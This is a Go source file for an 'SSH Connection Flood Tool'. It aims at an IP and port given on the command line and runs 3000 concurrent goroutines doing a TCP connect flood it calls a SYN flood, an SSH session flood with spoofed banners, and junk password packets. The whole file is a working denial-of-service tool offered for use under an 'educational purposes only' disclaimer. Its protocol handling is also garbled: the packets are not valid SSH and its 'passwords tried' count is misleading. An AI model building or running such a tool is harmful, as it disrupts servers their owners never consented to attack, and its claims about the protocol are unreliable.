package main

import (
    "crypto/rand"
    "fmt"
    "net"
    "os"
    "strconv"
    "strings"
    "sync"
    "sync/atomic"
    "time"
)

var (
    connections int64
    packets     int64
    passwords   int64
)

// SSH banners that mimic real SSH servers
var sshBanners = []string{
    "SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5",
    "SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2",
    "SSH-2.0-OpenSSH_7.4p1 CentOS",
    "SSH-2.0-OpenSSH_8.1 FreeBSD-20200910",
    "SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3",
    "SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.10",
    "SSH-2.0-OpenSSH_7.7",
    "SSH-2.0-dropbear_2020.81",
}

// Common usernames for SSH brute force
var usernames = []string{
    "root", "admin", "administrator", "user", "test", "guest",
    "ubuntu", "centos", "debian", "pi", "raspberry", "oracle",
    "postgres", "mysql", "ftp", "www-data", "nginx", "apache",
}

// Generate random password
func randomPassword(length int) string {
    const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:,.<>?"
    bytes := make([]byte, length)
    rand.Read(bytes)
    for i, b := range bytes {
        bytes[i] = charset[b%byte(len(charset))]
    }
    return string(bytes)
}

// Generate random username
func randomUsername() string {
    return usernames[int(time.Now().UnixNano())%len(usernames)]
}

// Generate random SSH banner
func randomSSHBanner() string {
    return sshBanners[int(time.Now().UnixNano())%len(sshBanners)]
}

// TCP SYN flood
func synFlood(targetIP string, targetPort int, wg *sync.WaitGroup) {
    defer wg.Done()
    
    for {
        // Create raw socket for SYN flood
        conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", targetIP, targetPort))
        if err != nil {
            continue
        }
        
        // Send SYN
        conn.Write([]byte{})
        atomic.AddInt64(&packets, 1)
        
        // Close connection (simulates SYN)
        conn.Close()
        
        // Small delay to avoid overwhelming local system
        time.Sleep(time.Microsecond * 10)
    }
}

// SSH connection flood with legitimate banners
func sshFlood(targetIP string, targetPort int, wg *sync.WaitGroup) {
    defer wg.Done()
    
    for {
        conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", targetIP, targetPort), 2*time.Second)
        if err != nil {
            continue
        }
        
        atomic.AddInt64(&connections, 1)
        
        // Set deadline for connection
        conn.SetDeadline(time.Now().Add(5 * time.Second))
        
        // Send legitimate SSH banner
        banner := randomSSHBanner() + "\r\n"
        conn.Write([]byte(banner))
        atomic.AddInt64(&packets, 1)
        
        // Read server response
        buffer := make([]byte, 1024)
        conn.Read(buffer)
        
        // Send SSH key exchange init
        conn.Write([]byte("\x00\x00\x01\x14\x06\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"))
        atomic.AddInt64(&packets, 1)
        
        // Simulate SSH handshake with multiple packets
        for i := 0; i < 3; i++ {
            time.Sleep(time.Millisecond * 10)
            conn.Write([]byte(fmt.Sprintf("\x00\x00\x00\x0c\x06%s", randomPassword(8))))
            atomic.AddInt64(&packets, 1)
            atomic.AddInt64(&passwords, 1)
        }
        
        // Send user auth request
        username := randomUsername()
        authPacket := fmt.Sprintf("\x00\x00\x00%s%s\x00\x00\x00%s", 
            string(byte(len(username))), username, randomPassword(12))
        conn.Write([]byte(authPacket))
        atomic.AddInt64(&packets, 1)
        atomic.AddInt64(&passwords, 1)
        
        // Simulate SSH encryption negotiation
        for i := 0; i < 5; i++ {
            time.Sleep(time.Millisecond * 5)
            conn.Write([]byte(fmt.Sprintf("\x00\x00\x00\x08\x15%s", randomPassword(6))))
            atomic.AddInt64(&packets, 1)
        }
        
        conn.Close()
        
        // Small delay
        time.Sleep(time.Millisecond * 1)
    }
}

// Combined attack with SYN/ACK simulation
func combinedAttack(targetIP string, targetPort int, wg *sync.WaitGroup) {
    defer wg.Done()
    
    for {
        // Phase 1: SYN
        conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", targetIP, targetPort))
        if err == nil {
            atomic.AddInt64(&packets, 1)
            
            // Phase 2: SYN+ACK (send some data then close)
            banner := randomSSHBanner() + "\r\n"
            conn.Write([]byte(banner))
            atomic.AddInt64(&packets, 1)
            
            // Phase 3: ACK with SSH data
            time.Sleep(time.Millisecond * 2)
            
            // Send SSH-like data
            sshData := fmt.Sprintf("\x00\x00\x00\x1c\x06%s\x00\x00\x00%s", 
                randomSSHBanner(), randomPassword(16))
            conn.Write([]byte(sshData))
            atomic.AddInt64(&packets, 1)
            atomic.AddInt64(&passwords, 1)
            
            // Send multiple SSH packets
            for i := 0; i < 10; i++ {
                time.Sleep(time.Millisecond * 1)
                conn.Write([]byte(fmt.Sprintf("\x00\x00\x00\x0a\x14%s", randomPassword(8))))
                atomic.AddInt64(&packets, 1)
                atomic.AddInt64(&passwords, 1)
            }
            
            conn.Close()
            atomic.AddInt64(&connections, 1)
        }
        
        time.Sleep(time.Microsecond * 50)
    }
}

func main() {
    if len(os.Args) != 4 {
        fmt.Println("Usage: ./ssh <ip> <port> <time in seconds>")
        fmt.Println("Example: ./ssh 192.168.1.1 22 60")
        os.Exit(1)
    }
    
    targetIP := os.Args[1]
    targetPort, err := strconv.Atoi(os.Args[2])
    if err != nil {
        fmt.Printf("Invalid port: %s\n", os.Args[2])
        os.Exit(1)
    }
    
    attackTime, err := strconv.Atoi(os.Args[3])
    if err != nil {
        fmt.Printf("Invalid time: %s\n", os.Args[3])
        os.Exit(1)
    }
    
    fmt.Println("╔══════════════════════════════════════╗")
    fmt.Println("║      SSH Connection Flood Tool       ║")
    fmt.Println("║   Emulating PuTTY & Legitimate SSH   ║")
    fmt.Println("╚══════════════════════════════════════╝")
    fmt.Printf("\nTarget: %s:%d\n", targetIP, targetPort)
    fmt.Printf("Duration: %d seconds\n", attackTime)
    fmt.Println("Mode: Maximum threads & rate")
    fmt.Println("Banners: Legitimate SSH server banners")
    fmt.Println("Protocol: TCP with SYN/ACK/SYN+ACK simulation")
    fmt.Println("\n[!] Starting attack...")
    
    var wg sync.WaitGroup
    threads := 1000 // Max threads for high performance
    
    // Start status printer
    go func() {
        for {
            time.Sleep(1 * time.Second)
            fmt.Printf("\r[+] Connections: %d | Packets: %d | Passwords: %d | Threads: %d",
                atomic.LoadInt64(&connections), 
                atomic.LoadInt64(&packets),
                atomic.LoadInt64(&passwords),
                threads)
        }
    }()
    
    // Start all attack types concurrently
    for i := 0; i < threads; i++ {
        wg.Add(1)
        go sshFlood(targetIP, targetPort, &wg)
        
        wg.Add(1)
        go synFlood(targetIP, targetPort, &wg)
        
        wg.Add(1)
        go combinedAttack(targetIP, targetPort, &wg)
    }
    
    // Run for specified duration
    time.Sleep(time.Duration(attackTime) * time.Second)
    
    fmt.Println("\n\n[!] Attack completed!")
    fmt.Printf("[+] Total connections attempted: %d\n", atomic.LoadInt64(&connections))
    fmt.Printf("[+] Total packets sent: %d\n", atomic.LoadInt64(&packets))
    fmt.Printf("[+] Total passwords tried: %d\n", atomic.LoadInt64(&passwords))
    fmt.Println("[!] Tool created for educational purposes only")
}
